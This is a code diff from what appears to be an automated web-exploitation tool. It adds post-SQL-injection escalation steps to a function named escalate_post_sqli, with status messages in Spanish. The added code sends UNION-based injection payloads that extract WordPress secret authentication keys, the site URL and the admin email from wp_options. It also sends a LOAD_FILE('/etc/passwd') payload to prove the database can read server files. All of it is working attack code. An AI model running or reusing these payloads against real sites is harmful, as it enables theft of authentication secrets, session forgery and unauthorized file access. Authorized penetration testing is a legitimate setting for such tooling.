@@ -13513,6 +13513,36 @@ def escalate_post_sqli(
     except Exception:
         pass
 
+    # 5. wp_options — WordPress secret keys + site URL (high-value intel)
+    try:
+        body = _sqli_req(
+            "1 AND 1=2 UNION SELECT CONCAT(option_name,':',SUBSTRING(option_value,1,80)),2 "
+            "FROM wp_options WHERE option_name IN "
+            "('auth_key','secure_auth_key','logged_in_key','siteurl','admin_email') "
+            "LIMIT 5-- -"
+        )
+        _opts: list = re.findall(r"(auth_key|secure_auth_key|logged_in_key|siteurl|admin_email)"
+                                  r":([^\s<\"']{5,80})", body, re.I)
+        if _opts:
+            result["wp_options"] = dict(_opts[:5])
+            result["escalation_level"] = "data_access"
+            step(f"  post-sqli: {len(_opts)} wp_option(s) extraídas (secret keys/siteurl)")
+    except Exception:
+        pass
+
+    # 6. LOAD_FILE — read /etc/passwd to prove file-read privilege
+    try:
+        body = _sqli_req(
+            "1 AND 1=2 UNION SELECT LOAD_FILE('/etc/passwd'),2-- -"
+        )
+        if re.search(r"root:x:0:0", body):
+            result["load_file_read"] = "/etc/passwd"
+            result["db_has_file_priv"] = True
+            result["escalation_level"] = "file_access"
+            step("  post-sqli: LOAD_FILE('/etc/passwd') devuelve contenido — FILE_PRIV=YES")
+    except Exception:
+        pass
+
     return result
 
 
